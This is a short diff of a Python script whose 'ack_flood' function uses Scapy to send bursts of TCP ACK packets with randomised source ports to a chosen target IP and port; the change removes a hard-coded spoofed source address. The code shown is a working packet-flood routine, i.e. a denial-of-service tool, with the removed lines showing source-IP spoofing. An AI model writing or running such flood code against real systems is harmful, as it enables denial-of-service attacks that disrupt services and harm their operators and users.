@@ -18,7 +18,7 @@ def load_roster(path):
         return json.load(f)
 
 
-def ack_flood(dest_ip, dest_port, packet_count=1000, src_ip="192.168.28.203"):
+def ack_flood(dest_ip, dest_port, packet_count=1000):
     """Send a burst of TCP ACK packets to the specified target."""
     if IP is None:
         print("Scapy is required to send packets.")
@@ -26,7 +26,7 @@ def ack_flood(dest_ip, dest_port, packet_count=1000, src_ip="192.168.28.203"):
 
     for _ in range(packet_count):
         src_port = random.randint(1024, 65535)
-        pkt = IP(src=src_ip, dst=dest_ip) / TCP(
+        pkt = IP(dst=dest_ip) / TCP(
             sport=src_port,
             dport=dest_port,
             flags="A"
